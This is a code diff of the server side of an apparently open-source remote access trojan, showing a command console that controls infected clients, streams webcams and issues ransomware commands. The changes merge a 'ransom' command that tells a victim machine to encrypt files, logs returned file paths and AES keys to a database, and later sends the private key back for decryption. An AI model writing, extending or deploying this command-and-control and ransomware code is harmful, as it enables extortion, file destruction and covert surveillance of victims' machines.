@@ -115,7 +115,6 @@ class Server(threading.Thread):
             'quit'          :   self.quit_server,
             'query'         :   self.query_database,
             'ransom'        :   self.ransom_client,
-            'restore'       :   self.restore_client,
             'results'       :   self.show_task_results,
             'save'          :   self.save_task_results,
 	    'sendall'	    :   self.sendall_clients,
@@ -147,12 +146,16 @@ class Server(threading.Thread):
             print(self._text_color + self._text_style)
 
     def _print(self, data):
-        print(self._text_color + self._text_style)
         try:
             data     = json.loads(bytes(data))
             max_len  = "{:<%d}" % int(max([len(i) for i in data.keys()]) + 2)
+            if not len([k for k in ['task','client','result', 'command'] if k not in data.keys()]):
+                return
         except: 
             data = bytes(data)
+            if u'prompt' in data:
+                return
+        print(self._text_color + self._text_style)
         if self.current_client:
             with self.current_client.lock:
                 try:
@@ -565,46 +568,40 @@ class Server(threading.Thread):
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
 
-    def ransom_client(self, path):
+    def ransom_client(self, args=None):
         if self.current_client:
-            client = self.current_client
-            port = random.randint(10000, 65535)
-            sock = socket.socket()
-            sock.bind(('0.0.0.0', port))
-            sock.listen(1)
-            self.send_client("ransom {} {}".format(path, port), client.name)
-            c, a = sock.accept()
-            c.settimeout(10.0)
-            while True:
-                buff = ''
-                while '\n' not in buff:
+            if not args or 'encrypt' in str(args):
+                self.send_client('ransom %s' % str(args), self.current_client.name)
+                self.current_client.connection.settimeout(1.0)
+                while True:
                     try:
-                        buff += c.recv(2048)
+                        output = self.recv_client(self.current_client.name)
+                        if output:
+                            try:
+                                output = json.loads(output)
+                                if output.get('result') and 'file_path' in output.get('result') and 'aes_key' in output.get('result'):
+                                    result = output.get('result')
+                                    self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ('{}','{}','{}')".format(self.current_client.session, result.get('file_path'), result.get('aes_key')), display=false)
+                                else:
+                                    print("Skipping output: '{}'".format(str(output)))
+                            except:
+                                print("Skipping output: '{}'".format(str(output)))
                     except socket.timeout:
                         break
-                if buff and len(str(buff)) and bytes('0' * 64) not in buff:
-                    data = self._decrypt_aes(buff, self._deobfuscate(client.session_key))
-                    task = json.loads(data)
-                    save = self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ({})".format("'{}', ".format(i) for i in [task['session'], task['result']['file_path'], task['result']['aes_key']]), display=False)
-                else:
-                    break
-        else:
-            self._error("No client selected")
-            self._return()
+                    except Exception as e:
+                        print('{} error: {}'.format(self.ransom_client.func_name, str(e)))
 
-    def restore_client(self, *args):
-        if self.current_client:
-            client = self.current_client
-            try:
-                result = self.query_database("SELECT * FROM sessions WHERE id='{}'".format(client.session), display=False)
-                if result:
-                    result = json.loads(result)
-                    private_key = result['private_key']
-                    self.send_client(private_key, client.name)
-                else:
-                    return "No private key found for Session ID '{}'".format(client.session)
-            except Exception as e:
-                self._error("{} returned error: {}".format(self.restore_client.func_name, str(e)))
+            elif 'decrypt' in str(args):
+                try:
+                    result = self.query_database("SELECT * FROM sessions WHERE id='{}'".format(self.current_client.session), display=False)
+                    if result:
+                        result = json.loads(result)
+                        self.send_client("ransom decrypt %s" % result.get('private_key'), self.current_client.name)
+                        return
+                    else:
+                        return "Session_'{}':-No-Private-Key".format(self.current_client.session)
+                except Exception as e:
+                    return "{} returned error: {}".format(self.ransom_client.func_name, str(e))
         else:
             self._error("No client selected")
             self._return()
@@ -631,7 +628,7 @@ class Server(threading.Thread):
             self._error("No client selected")
             self._return()
         try:
-            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""))
+            return self.query_database("SELECT * FROM tasks WHERE session='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""), display=False)
         except Exception as e:
             self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
     
@@ -686,7 +683,7 @@ class Server(threading.Thread):
                         else:
                             self._print(output)
         else:
-            self._error("No session key found")
+            self._error("No_session_key_found")
             self._return()
     
     def connection_handler(self):
@@ -702,6 +699,10 @@ class Server(threading.Thread):
             self.run() if not self.current_client else self.current_client.run()
             
     def run(self):
+        _ = threads.pop('connection_handler', None)
+        del _
+        threads['connection_handler'] = threading.Thread(target=self.connection_handler, name=time.time())
+        threads['connection_handler'].start()
         while True:
             try:
                 self.shell.wait()
@@ -798,7 +799,7 @@ class ClientHandler(threading.Thread):
     def _session(self):
         try:
             query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
-            session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content
+            session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content.strip().rstrip()
             print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
             ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
             self.connection.sendall(ciphertext + '\n')
@@ -833,11 +834,9 @@ class ClientHandler(threading.Thread):
     def run(self):
         while True:
             try:
-                if threads['server'].exit_status:
-                    break
                 task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                 self.shell.wait()
-                if type(task) is dict:
+                if task:
                     if 'prompt' in task.get('command'):
                         self.prompt     = task
                         command         = self._prompt(bytes(self.prompt.get('result')).format(self.name))
@@ -857,13 +856,15 @@ class ClientHandler(threading.Thread):
                         threads['server'].show_usage_help(data=task.get('result'))
                         self.shell.set()
                     elif 'standby' in task.get('command'):
-                        print(task.get('result'))
+                        threads['server']._print(task.get('result'))
                         break
                     else:
                         if task.get('result'):
-                            threads['server']._print(task['result'])
+                            threads['server']._print(task.get('result'))
                             threads['server'].save_task_results(task)
                 self.prompt = None
+                if threads['server'].exit_status:
+                    break
             except Exception as e:
                 self._error(str(e))
                 break
